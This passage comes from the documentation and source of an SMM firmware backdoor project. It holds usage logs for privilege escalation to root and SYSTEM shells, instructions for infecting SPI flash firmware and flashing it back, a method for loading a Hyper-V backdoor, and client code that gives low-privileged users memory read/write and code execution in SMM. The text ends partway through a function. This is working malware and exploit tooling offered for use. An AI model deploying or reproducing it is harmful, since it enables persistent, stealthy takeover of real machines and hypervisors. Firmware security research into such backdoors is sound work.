00000016 - backdoor.c(1216) : SMM system table is at 0x7b7f84c0
00000017 - backdoor.c(1177) : Max. SW SMI value is 0xff
00000018 - backdoor.c(1188) : SW SMI handler is at 0x7b5effb8
00000019 - exploit.c(271) : Communicate(): status = 0xe, size = 0x19
00000020 - exploit.c(277) : Exploit(): Exploitation success
00000021 - backdoor.c(409) : SmmCtlHandle(): Periodic timer SW SMI was enabled
00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()
00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000
```

Check for responding backdoor and show basic information about System Management Mode execution environment:

```
# python2 smm_backdoor.py --use-timer --test
[+] Checking if SMM backdoor is present...
[+] Obtaining information...

  CR0 = 0x80000033
  CR3 = 0x7b7b1000
 SMST = 0x7b7f84c0

[+] SMRAM regions:

 * 0x7b000000:7b000fff
 * 0x7b001000:7b7fffff
```

Example of reading of arbitrary physical memory, beginning of SMRAM region in this case:

```
# python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80
7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........
7b000010: 00 60 7a 7b 00 00 00 00 00 80 00 00 00 00 00 00 | ..z.............
7b000020: 33 00 00 80 00 00 00 00 00 10 7b 7b 00 00 00 00 | 3...............
7b000030: 68 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............
7b000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
7b000050: 00 00 00 00 00 00 00 00 00 00 c0 84 7f 7b 00 00 | ................
7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................
7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................
```

To read and dump entire SMRAM regions into the file you can use the following command:

```
# python2 smm_backdoor.py --dump-smram
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Dumping SMRAM regions, this may take a while...
[+] Creating SMRAM_dump_7b000000_7b7fffff.bin
```

Example of `smm_backdoor_privesc_linux.py` client program usage for local privileges escalation under the Linux operating system:

```
$ python2 smm_backdoor_privesc_linux.py
[+] Initializing SMM backdoor client...
[+] User CR3 = 0x271b14000
[+] LSTAR = 0xffffffff81e00010
[+] do_syscall_64() is at 0xffffffff810025c0
[+] sys_call_table() is at 0xffffffff822001a0
[+] sys_getuid() is at 0xffffffff81073c10
[+] task_struct offset is 0x14d40
[+] cred offset is 0x628
[+] IA32_KERNEL_GS_BASE = 0xffff888277a00000
[+] Process task_struct is at 0xffff88827148db00
[+] Process cred is at 0xffff88827289d000
[+] Overwriting process credentials...
[+] Done, spawning root shell...

sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)
```

Example of `smm_backdoor_privesc_win.py` client program usage for local privileges escalation under the Windows operating system:

```
PS C:\> python2 smm_backdoor_privesc_win.py
[+] Initializing SMM backdoor client...
[+] NT version is 10.0.19041
[+] _EPROCESS Token offset is 0x04b8
[+] _KPCR KernelDirectoryTableBase offset is 0x9000
[+] _KPCR structure is at 0xfffff8005f486000
[+] KVA shadow is disabled or not present
[+] Kernel CR3 value is 0x0000000141491000
[+] Token object address is 0xffffcd0ef752c060
[+] Present privileges: 0x1e73deff20 -> 0x1ff2ffffbc
[+] Enabled privileges: 0x60900000 -> 0x1ff2ffffbc
[+] Current process object address is 0xffffa60de954a080
[+] System process object address is 0xffffa60de12dd080
[+] Overwriting process token...
[+] Done, spawning SYSTEM shell...

Microsoft Windows [Version 10.0.19041.208]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

## Deploying the backdoor using firmware flash image infection

To infect platform firmware stored in the flash chip on the motherboard with SMM backdoor you will need some SPI flash programmer, I prefer to use cheap and widely available [FT2232H Mini Module](https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf) from FTDI. Also, there's a [board called Tigrad](https://www.crowdsupply.com/securinghw/tigard) &minus; multi-protocol, multi-voltage tool for hardware hacking that can work as SPI flash programmer. In addition to the programmer you also will need the following tools:

 * [UEFITool](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0) utility to parse and edit UEFI flash images
 * [Flashrom](https://github.com/flashrom/flashrom/releases/tag/v1.2) utility to work with SPI flash programmer
 * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its de-soldering

First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. 

In case if you happen to find WSON8 packaged chip on you board instead of usual SOIC8 &minus; you can either de-solder it or use some sort of DIY [spring-loaded pogo pin](https://mouser.com/c/?q=pogo%20pin) test probe like this one to tap its pads:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_probe.jpg" width="424">

Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_wiring.png" width="542">

Now you can read flash chip contents using Flashrom:

```
# flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin
```

After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI SMM driver to infect and extract its PE32 image section from the firmware image:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/uefi_tool.png" width="701">

For example, I picked `NvramSmm` UEFI SMM driver responsible for NVRAM access as pretty much suitable one. Then you can infect extracted driver with SMM backdoor using `--infect` command line option of `smm_backkdoor.py` program:

```
# python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi
```

After that you have to replace original driver image with `NvramSmm_infected.bin` one in UEFITool, save resulting firmware image and flash it back into the chip:

```
# flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
```

## Using together with Hyper-V Backdoor

Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside arbitrary guest or host Hyper-V partition. 

To do that you need to save `backdoor.bin` file [form Hyper-V backdoor repository](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor.bin) as `hyper_v_backdoor.bin` in the same folder with `smm_backdoor_hyper_v.py` test client program and then just run it:

```
PS C:\> python2 smm_backdoor_hyper_v.py
[+] Initializing SMM backdoor client...
[+] Searching for VMCS structure in physical memory, this might take a while...

 Scan step: 0x0000000001000000
 Scan from: 0x0000000100000000
   Scan to: 0x0000000200000000

[+] Hypervisor VMCS structure was found

 Physical address: 0x0000000109341000
         HOST_CR3: 0x0000000100103000
         HOST_RIP: 0xfffff87b6963236a

[+] HvlpLowMemoryStub() is at 0x0000000000002000
[+] Host operating system version is 2004
[+] VM exit handler is at 0xfffff87b6960e010
[+] VM exit handler call is at 0xfffff87b69632440
[+] 14 bytes jump is at 0xfffff87b69632466
[+] Backdoor entry is at 0x0000000000002700
[+] Backdoor code size is 860 bytes
[+] Patching VM exit handler call...
[+] Done, Hyper-V backdoor was successfully installed
```

In case when `smm_backdoor_hyper_v.py` is unable to locate target VMCS region &minus; you can override its default scanning options by specifying appropriate values in `--scan-from`, `--scan-to` and `--scan-step` command line arguments of the program. Since VMCS region location stage might take a while, you also can use `--verbose` option of the program to display operation progress information.

After successful Hyper-V backdoor load you can run [its client program](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_client) to ensure that backdoor is up and responding:

```
PS C:\> .\hyper_v_backdoor_client.exe 0
[+] Running on CPU #0
[+] Hyper-V backdoor is running

      Hypervisor CR0: 0x80010031
      Hypervisor CR3: 0x100103000
      Hypervisor CR4: 0x422e0
 Hypervisor IDT base: 0xfffff87b69a00180 (limit = 0xffff)
  Hypervisor GS base: 0xfffff87b69ba6000
        VMCS address: 0x109341000
     VM exit handler: 0xfffff87b6960e010
       VM exit count: 0x86ed
       VM call count: 0x2518
```

For more information about Hyper-V backdoor client program and performing guest to host VM escape attacks on Windows targets you can [check usage examples](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv#vm-escape-related-commands) in Hyper-V backdoor documentation. 


## Building from the source code

To compile SMM backdoor UEFI driver `SmmBackdoorNg_X64.efi` you need to have a Windows machine with [Visual Studio](https://visualstudio.microsoft.com/downloads/) and [EDK II source code](https://github.com/tianocore/edk2) installed.

To build project from the source code you need to perform the following steps:

  1. Install Visual Studio and EDK II [following its setup instructions](https://github.com/tianocore/tianocore.github.io/wiki/Common-instructions).

  2. Copy `SmmBackdoorNg` project directory into the EDK source code directory.

  3. Edit `Conf/target.txt` file of EDK, set `ACTIVE_PLATFORM` value to `OvmfPkg/OvmfPkgX64.dsc` and `TOOL_CHAIN_TAG` in according to your installed version of Visual Studio.

  4. Edit `OvmfPkg/OvmfPkgX64.dsc` file of EDK and add `SmmBackdoorNg/SmmBackdoorNg.inf` line at its end.

  5. Open Visual Studio command prompt and change current directory to previously copied `SmmBackdoorNg` directory.

  6. Execute `build` command to compile SMM backdoor UEFI driver.

  7. Resulting image file will be created in appropriate sub-directory of `Build/OvmfX64/` EDK directory depending on used build target and Visual Studio version.


## About

Developed by:<br />
Dmytro Oleksiuk (aka Cr4sh)

[cr4sh0@gmail.com](mailto:cr4sh0@gmail.com)<br />
[http://blog.cr4.sh](http://blog.cr4.sh)

```

`SmmBackdoorNg.inf`:

```inf
[defines]
  INF_VERSION = 0x00010005 
  BASE_NAME = SmmBackdoorNg
  FILE_GUID = 21D5AE41-147E-4C44-AE72-ECD9BBB454D4
  MODULE_TYPE = DXE_SMM_DRIVER

[Sources]
  src/debug.c
  src/loader.c
  src/printf.c
  src/backdoor.c
  src/exploit.c
  src/serial.c
  src/std.c
  src/virtmem.c

[Sources.X64]
  src/asm/amd64/common_asm.asm

[Packages]
  MdePkg/MdePkg.dec
  MdeModulePkg/MdeModulePkg.dec
  IntelFrameworkPkg/IntelFrameworkPkg.dec  
  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec  

[LibraryClasses]

[Protocols]
  gEfiSimpleTextOutProtocolGuid
  gEfiLoadedImageProtocolGuid
  gEfiDevicePathProtocolGuid
  gEfiSerialIoProtocolGuid  
  gEfiSmmAccess2ProtocolGuid
  gEfiSmmBase2ProtocolGuid
  gEfiSmmCommunicationProtocolGuid
  gEfiSmmCpuProtocolGuid
  gEfiSmmSwDispatch2ProtocolGuid
  gEfiSmmPeriodicTimerDispatch2ProtocolGuid

[Guids]
  gEfiEventDxeDispatchGuid
  
[Depex]
  TRUE

```

`config.h`:

```h

#ifndef _CONFIG_H_
#define _CONFIG_H_

/*
    Enable debug output generated by DbgMsg() function.
    See src/debug.c for more details.
*/
#define BACKDOOR_DEBUG

/*
    Write debug messages into the OVMF debug output port.
    Uncomment this option if you're planning to run backdoor on QEMU.
*/
// #define BACKDOOR_DEBUG_OVMF

/*
    Write debug messages into the ttyS0 using 0x3F8 I/O port.
    Most likely you will never need this option because COM port of
    modern computers usually connected to PCH via dedicated Super I/O 
    chip and during PEI phase it's not initialized yet.
*/
#define BACKDOOR_DEBUG_SERIAL

// serial port configuration for BACKDOOR_DEBUG_SERIAL
#define SERIAL_BAUDRATE 115200
#define SERIAL_PORT_NUM SERIAL_PORT_0

/* 
    Debug messages buffer size 
*/
#define DEBUG_OUTPUT_SIZE (PAGE_SIZE * 0x10)

/*
    Use periodic timer software SMI handler to communicate with
    the backdoor from low privileged user.    
*/
#define USE_PERIODIC_TIMER

#endif

```

`interface.h`:

```h

#ifndef _INTERFACE_H_
#define _INTERFACE_H_

#define MAX_SMRAM_REGIONS 0x10

/* 
    SW SMI command value for communicating with backdoor SMM code
*/
#define BACKDOOR_SW_SMI_VAL 0xcc

/*
    Name and GUID of NVRAM variable to store debug messages buffer address
*/
#define BACKDOOR_VAR_NAME L"SmmBackdoorInfo"
#define BACKDOOR_VAR_GUID { 0xcacdf34, 0xee00, 0x4230, \
                          { 0xaf, 0x5d, 0x8b, 0xae, 0x0, 0x72, 0xcb, 0xea } }

/*
    Backdoor CTL commands
*/
#define BACKDOOR_CTL_PING           0x00   // check if backdoor is alive
#define BACKDOOR_CTL_INFO           0x01   // return backdoor information
#define BACKDOOR_CTL_READ_PHYS      0x02   // read physical memory
#define BACKDOOR_CTL_READ_VIRT      0x03   // read virtual memory
#define BACKDOOR_CTL_WRITE_PHYS     0x04   // write physical memory
#define BACKDOOR_CTL_WRITE_VIRT     0x05   // write virtual memory
#define BACKDOOR_CTL_EXECUTE        0x06   // execute code at given address
#define BACKDOOR_CTL_MSR_GET        0x07   // get MSR value
#define BACKDOOR_CTL_MSR_SET        0x08   // set MSR value
#define BACKDOOR_CTL_STATE_GET      0x09   // get saved state register value
#define BACKDOOR_CTL_STATE_SET      0x0a   // set saved state register value
#define BACKDOOR_CTL_GET_PHYS_ADDR  0x0b   // translate virtual address to physical
#define BACKDOOR_CTL_TIMER_ENABLE   0x0c   // enable periodic timer software SMI
#define BACKDOOR_CTL_TIMER_DISABLE  0x0d   // disable periodic timer software SMI
#define BACKDOOR_CTL_FIND_VMCS      0x0e   // find potential VMCS region

/* 
    Magic register values to communicate with the backdoor
    using periodic timer software SMI handler
*/
#define BACKDOOR_CALL_R8_VAL 0xfe4020d4e8fa6c4d
#define BACKDOOR_CALL_R9_VAL 0xd344171e43eafc19

#pragma pack(1)

typedef struct _BACKDOOR_SMRAM_REGION
{
    UINT64 Addr;
    UINT64 Size;

} BACKDOOR_SMRAM_REGION,
*PBACKDOOR_SMRAM_REGION;

/*
    Arguments for backdoor CTL commands
*/
typedef struct _BACKDOOR_CTL
{
    UINT64 Status;

    union
    {
        // for BACKDOOR_CTL_INFO
        struct
        {
            UINT64 Cr0;
            UINT64 Cr3;
            UINT64 Smst;
            BACKDOOR_SMRAM_REGION Smram[MAX_SMRAM_REGIONS];

        } Info;

        /* 
            for BACKDOOR_CTL_READ_PHYS, BACKDOOR_CTL_READ_VIRT,
                BACKDOOR_CTL_WRITE_PHYS, BACKDOOR_CTL_WRITE_VIRT
        */
        struct
        {
            UINT64 Addr;
            UINT64 Size;
            UINT64 Buff;

        } Mem;

        // for BACKDOOR_CTL_EXECUTE
        struct
        {
            UINT64 Addr;

        } Execute;

        // for BACKDOOR_CTL_MSR_GET, BACKDOOR_CTL_MSR_SET
        struct
        {
            UINT64 Register;
            UINT64 Value;

        } Msr;

        // for BACKDOOR_CTL_STATE_GET, BACKDOOR_CTL_STATE_SET
        struct
        {
            UINT64 Register;
            UINT64 Value;

        } SaveState;

        // for BACKDOOR_CTL_GET_PHYS_ADDR
        struct 
        {
            UINT64 AddrVirt;
            UINT64 AddrPhys;
            UINT64 Eptp;
            UINT64 Cr3;

        } PhysAddr;

        // for BACKDOOR_CTL_FIND_VMCS
        struct 
        {
            UINT64 Addr;
            UINT64 Size;
            UINT64 Found;

        } FindVmcs;

    } Args;

} BACKDOOR_CTL,
*PBACKDOOR_CTL;

#pragma pack()

#endif

```

`smm_backdoor.py`:

```py
#!/usr/bin/env python

import sys, os, platform, time, shutil, unittest, mmap, ctypes
from ctypes import *
from struct import pack, unpack, calcsize
from optparse import OptionParser, make_option

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xCC

#
# backdoor CTL commands
#
BACKDOOR_CTL_PING           = 0x00  # check if backdoor is alive
BACKDOOR_CTL_INFO           = 0x01  # return backdoor information
BACKDOOR_CTL_READ_PHYS      = 0x02  # read physical memory
BACKDOOR_CTL_READ_VIRT      = 0x03  # read virtual memory
BACKDOOR_CTL_WRITE_PHYS     = 0x04  # write physical memory
BACKDOOR_CTL_WRITE_VIRT     = 0x05  # write virtual memory
BACKDOOR_CTL_EXECUTE        = 0x06  # execute code at given address
BACKDOOR_CTL_MSR_GET        = 0x07  # get MSR value
BACKDOOR_CTL_MSR_SET        = 0x08  # set MSR value
BACKDOOR_CTL_STATE_GET      = 0x09  # get saved state register value
BACKDOOR_CTL_STATE_SET      = 0x0a  # set saved state register value
BACKDOOR_CTL_GET_PHYS_ADDR  = 0x0b  # translate virtual address to physical
BACKDOOR_CTL_TIMER_ENABLE   = 0x0c  # enable periodic timer software SMI
BACKDOOR_CTL_TIMER_DISABLE  = 0x0d  # disable periodic timer software SMI
BACKDOOR_CTL_FIND_VMCS      = 0x0e  # find potential VMCS region

#
# Magic register values to communicate with the backdoor using
# periodic timer software SMI handler
#
TIMER_R8_VAL = 0xfe4020d4e8fa6c4d
TIMER_R9_VAL = 0xd344171e43eafc19

# how many cycles to wait for the periodic timer software SMI
TIMER_RETRY = 0x400000000

#
# EFI_SMM_CPU_PROTOCOL save state register numbers
#
SMM_SAVE_STATE_GDTBASE      = 4
SMM_SAVE_STATE_IDTBASE      = 5
SMM_SAVE_STATE_LDTBASE      = 6
SMM_SAVE_STATE_GDTLIMIT     = 7
SMM_SAVE_STATE_IDTLIMIT     = 8
SMM_SAVE_STATE_LDTLIMIT     = 9
SMM_SAVE_STATE_LDTINFO      = 10
SMM_SAVE_STATE_ES           = 20
SMM_SAVE_STATE_CS           = 21
SMM_SAVE_STATE_SS           = 22
SMM_SAVE_STATE_DS           = 23
SMM_SAVE_STATE_FS           = 24
SMM_SAVE_STATE_GS           = 25
SMM_SAVE_STATE_LDTR_SEL     = 26
SMM_SAVE_STATE_TR_SEL       = 27
SMM_SAVE_STATE_DR7          = 28
SMM_SAVE_STATE_DR6          = 29
SMM_SAVE_STATE_R8           = 30
SMM_SAVE_STATE_R9           = 31
SMM_SAVE_STATE_R10          = 32
SMM_SAVE_STATE_R11          = 33
SMM_SAVE_STATE_R12          = 34
SMM_SAVE_STATE_R13          = 35
SMM_SAVE_STATE_R14          = 36
SMM_SAVE_STATE_R15          = 37  
SMM_SAVE_STATE_RAX          = 38
SMM_SAVE_STATE_RBX          = 39
SMM_SAVE_STATE_RCX          = 40
SMM_SAVE_STATE_RDX          = 41
SMM_SAVE_STATE_RSP          = 42
SMM_SAVE_STATE_RBP          = 43
SMM_SAVE_STATE_RSI          = 44
SMM_SAVE_STATE_RDI          = 45
SMM_SAVE_STATE_RIP          = 46
SMM_SAVE_STATE_RFLAGS       = 51
SMM_SAVE_STATE_CR0          = 52
SMM_SAVE_STATE_CR3          = 53
SMM_SAVE_STATE_CR4          = 54

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with debug output buffer address
BACKDOOR_VAR = 'SmmBackdoorInfo-0cacdf34-ee00-4230-af5d-8bae0072cbea'

PAGE_SHIFT = 12
PAGE_SIZE  = 0x1000
PAGE_MASK  = 0xfffffffffffff000

DEBUG_OUTPUT_SIZE = PAGE_SIZE * 0x10

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

MEM_COMMIT  = 0x1000      
MEM_RESERVE = 0x2000   
MEM_RELEASE = 0x8000

align_up = lambda x, a: ((x + a - 1) // a) * a
align_down = lambda x, a: (x // a) * a

is_win32 = lambda: sys.platform == 'win32'

cs = None
stub_addr = None


if is_win32():

    # check for WoW64 in case of Windows
    if platform.architecture()[0] != '64bit':

        print('ERROR: WoW64 is not supported')
        exit()


class Singleton(type):

    _instances = {}
    
    def __call__(self, *args, **kwargs):

        if self not in self._instances:

            # create new instance
            self._instances[self] = super(Singleton, self).__call__(*args, **kwargs)
        
        return self._instances[self]


class ChipsecWrapper(object):

    __metaclass__ = Singleton

    class NoSuchVariable(Exception):

        pass

    def __init__(self):

        try:

            import chipsec.chipset
            import chipsec.hal.uefi
            import chipsec.hal.physmem
            import chipsec.hal.interrupts

        except ImportError:

            print('ERROR: chipsec is not installed')
            exit(-1)

        self.cs = chipsec.chipset.cs()
        
        # load chipsec helper
        self.cs.helper.start(True)
    
        # load needed sumbmodules
        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        
        self.mem = chipsec.hal.physmem.Memory(self.cs)

    def efi_var_get(self, var_name):

        # parse variable name string of name-GUID format
        name = var_name.split('-')

        # get variable data
        data = self.uefi.get_EFI_variable(name[0], '-'.join(name[1: ]), None)
        if data is None or len(data) == 0:

            raise(self.NoSuchVariable('Unable to query NVRAM variable %s' % var_name))

        return data

    efi_var_get_8 = lambda self, name: unpack('B', self.efi_var_get(name))[0]
    efi_var_get_16 = lambda self, name: unpack('H', self.efi_var_get(name))[0]
    efi_var_get_32 = lambda self, name: unpack('I', self.efi_var_get(name))[0]
    efi_var_get_64 = lambda self, name: unpack('Q', self.efi_var_get(name))[0]

    def mem_read(self, addr, size): 

        # read memory contents
        return self.mem.read_physical_mem(addr, size)

    def mem_write(self, addr, data): 

        # write memory contents
        return self.mem.write_physical_mem(addr, len(data), data)

    mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
    mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
    mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
    mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]

    mem_write_1 = lambda self, addr, v: self.mem_write(addr, pack('B', v))
    mem_write_2 = lambda self, addr, v: self.mem_write(addr, pack('H', v))
    mem_write_4 = lambda self, addr, v: self.mem_write(addr, pack('I', v))
    mem_write_8 = lambda self, addr, v: self.mem_write(addr, pack('Q', v))

    def send_sw_smi(self, code, data, rax = 0, rbx = 0, rcx = 0, rdx = 0, rsi = 0, rdi = 0):

        # fire synchronous SMI
        self.intr.send_SW_SMI(0, code, data, rax, rbx, rcx, rdx, rsi, rdi)


# class that inherits mmap.mmap and has the page address
class Mmap(mmap.mmap):

    class PyObj(Structure):

        _fields_ = [( 'ob_refcnt', c_size_t ),
                    ( 'ob_type', c_void_p )]

    # ctypes object for introspection
    class PyMmap(PyObj):

        _fields_ = [( 'ob_addr', c_size_t )]

    def __init__(self, *args, **kwarg):

        # get the page address by introspection of the native structure
        self.mem = self.PyMmap.from_address(id(self))
        self.old = None

        if is_win32():
            
            kernel32 = ctypes.windll.kernel32

            # fix return type of VirtualAlloc()
            kernel32.VirtualAlloc.restype = ctypes.c_void_p

            # remeber original address
            self.old = self.mem.ob_addr

            # allocate reguler (not mapped) virtual memory
            self.mem.ob_addr = kernel32.VirtualAlloc(0,
                                                     args[1],
                                                     MEM_COMMIT | MEM_RESERVE,
                                                     PAGE_READWRITE)   

            assert self.mem.ob_addr is not None 

        # get address of allocated memory
        self.addr = self.mem.ob_addr

    def close(self):

        if self.old is not None:

            # restore original address
            self.mem.ob_addr = self.old

            kernel32 = ctypes.windll.kernel32            

            # free allocated memory
            kernel32.VirtualFree(ctypes.c_void_p(self.addr), 0, MEM_RELEASE)

        super(Mmap, self).close()

    def __del__(self):

        # close mmap object to free allocated memory
        self.close()


def mem_alloc(size):

    if is_win32():

        # on Windows mmap() has different arguments
        return Mmap(-1, size, 'w')

    else:

        return Mmap(-1, size, mmap.PROT_WRITE)


class BackdoorControl(object):

    # initial value for BACKDOOR_CTL.Status
    STATUS_NONE = 0xffffffffffffffff

    EFI_SUCCESS             = 0
    EFI_INVALID_PARAMETER   = (1 << 63) | 2
    EFI_NOT_FOUND           = (1 << 63) | 14
    EFI_NO_MAPPING          = (1 << 63) | 17    

    class NoBackdoor(Exception):

        pass

    class BadArguments(Exception):

        pass

    class BadAddress(Exception):

        pass

    class BadVirtualAddress(Exception):

        pass

    class Info(object):

        MAX_SMRAM_REGIONS = 0x10

        def __init__(self, bd):

            self.smram = []

            # get basic information
            self.cr0, self.cr3, self.smst = bd._ctl_get('QQQ')

            for i in range(0, self.MAX_SMRAM_REGIONS):

                # obtain BACKDOOR_SMRAM_REGION
                addr, size = bd._ctl_get('QQ')
                if addr == 0 or size == 0:

                    # end of the list
                    break

                self.smram.append(( addr, size ))

    def __init__(self, cs):        

        # allocate test memory pages
        self.mem = mem_alloc(PAGE_SIZE)
        self.stub_addr = None
        self.cs = cs

    def _setaffinity(self, mask):

        if is_win32():

            kernel32 = ctypes.windll.kernel32

            CURRENT_THREAD = ctypes.c_void_p(-2)

            # execute SetThreadAffinityMask() 
            kernel32.SetThreadAffinityMask(CURRENT_THREAD, mask);

        else:

            # load libc
            libc = ctypes.cdll.LoadLibrary('libc.so.6')

            mask = ctypes.c_ulong(mask)

            # execute sched_setaffinity()
            libc.sched_setaffinity(0, ctypes.sizeof(ctypes.c_ulong), ctypes.pointer(mask))

    def _ctl_get(self, format, *args):

        # read BACKDOOR_CTL structure contents
        return unpack(format, self.mem.read(calcsize(format)))

    def _ctl_set(self, format, *args):        

        self.mem.seek(0)

        # write BACKDOOR_CTL structure contents        
        self.mem.write(pack(format, *args))
        self.mem.write('\0' * (PAGE_SIZE - calcsize(format)))

        self.mem.seek(0)    

    def _ctl_send_timer(self, ctl, arg):        

        #
        # Construct the code to call SMM backdoor using
        # periodic timer SW SMI
        #
        code =  '\x51'                                  # push    rcx
        code += '\x52'                                  # push    rdx
        code += '\x57'                                  # push    rdi
        code += '\x56'                                  # push    rsi
        code += '\x41\x50'                              # push    r8
        code += '\x41\x51'                              # push    r9
        code += '\x48\xbf' + pack('Q', ctl)             # mov     rdi, ctl
        code += '\x48\xbe' + pack('Q', arg)             # mov     rsi, arg
        code += '\xe8\x00\x00\x00\x00'                  # call    $+5
        code += '\x59'                                  # pop     rcx
        code += '\x48\x83\xc1\x23'                      # add     rcx, 35
        code += '\x48\xba' + pack('Q', TIMER_RETRY)     # mov     rdx, TIMER_RETRY
        code += '\x49\xb8' + pack('Q', TIMER_R8_VAL)    # mov     r8, MAGIC_R8_VAL
        code += '\x49\xb9' + pack('Q', TIMER_R9_VAL)    # mov     r9, MAGIC_R9_VAL
        code += '\x48\xff\xca'                          # dec     rdx
        code += '\x74\x02'                              # jz      $+4
        code += '\xff\xe1'                              # jmp     rcx
        code += '\x41\x59'                              # pop     r9
        code += '\x41\x58'                              # pop     r8
        code += '\x5e'                                  # pop     rsi
        code += '\x5f'                                  # pop     rdi
        code += '\x5a'                                  # pop     rdx
        code += '\x59'                                  # pop     rcx
        code += '\xc3'                                  # ret

        if is_win32():

            kernel32 = ctypes.windll.kernel32

            # fix return type of VirtualAlloc()
            kernel32.VirtualAlloc.restype = ctypes.c_void_p

            # allocate executable memory page
            stub_addr = kernel32.VirtualAlloc(0,
                                              PAGE_SIZE,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_EXECUTE_READWRITE)
            assert stub_addr is not None

            kernel32.RtlCopyMemory(ctypes.c_void_p(stub_addr), 
                                   ctypes.create_string_buffer(code), len(code))
        else:

            # allocate executable memory page
            stub = Mmap(-1, PAGE_SIZE, prot = mmap.PROT_WRITE | mmap.PROT_EXEC,
                                       flags = mmap.MAP_ANON | mmap.MAP_PRIVATE)

            stub.write(code)            
            stub_addr = stub.addr

        # execute current process only on 1-st CPU
        self._setaffinity(1)

        # pass execution to the generated code
        func = ctypes.CFUNCTYPE(None)(stub_addr)
        func()

        if is_win32():

            # free memory page
            kernel32.VirtualFree(ctypes.c_void_p(stub_addr), 0, MEM_RELEASE)

    def _ctl_send_smi(self, code, args):

        # send backdoor control request
        self.cs.send_sw_smi(BACKDOOR_SW_SMI_VAL, code, rcx = args)

    def _ctl_send(self, code):

        if self.cs is None:

            # send backdoor control request using periodic timer
            self._ctl_send_timer(code, self.mem.addr)

        else:

            # send backdoor control request using software SMI
            self._ctl_send_smi(code, self.mem.addr)

        status = self._ctl_get('Q')[0]

        # check reply status
        if status == self.STATUS_NONE:

            raise(self.NoBackdoor('Backdoor is not present'))

        return status

    def ping(self):

        # set input arguments
        self._ctl_set('Q', self.STATUS_NONE)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_PING) == 0

    def info(self):

        # set input arguments
        self._ctl_set('Q', self.STATUS_NONE)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_INFO) == 0

        # read information
        return self.Info(self)

    def _check_mem_status(self, status):

        if status == self.EFI_INVALID_PARAMETER:

            # invalid arguments passed to the backdoor request
            raise(self.BadArguments('Backdoor request bad arguments'))

        elif status == self.EFI_NO_MAPPING:

            # bad buffer address passed to the backdoor request
            raise(self.BadAddress('Backdoor request bad buffer address'))

        elif status == self.EFI_NOT_FOUND:

            # bad target virtual address passed to the backdoor request
            raise(self.BadVirtualAddress('Backdoor request bad virtual address'))

        return status

    def _write_mem(self, code, addr, data):

        size = len(data)

        assert size <= PAGE_SIZE and size > 0
        assert (addr & PAGE_MASK) == ((addr + size - 1) & PAGE_MASK)

        # allocate data buffer
        buff = mem_alloc(PAGE_SIZE)
        
        buff.write(data)
        buff.write('\0' * (PAGE_SIZE - size))

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, size, buff.addr)

        # perform request
        assert self._check_mem_status(self._ctl_send(code)) == self.EFI_SUCCESS

    def _read_mem(self, code, addr, size):

        assert size <= PAGE_SIZE and size > 0
        assert (addr & PAGE_MASK) == ((addr + size - 1) & PAGE_MASK)

        # allocate data buffer
        buff = mem_alloc(PAGE_SIZE)
        
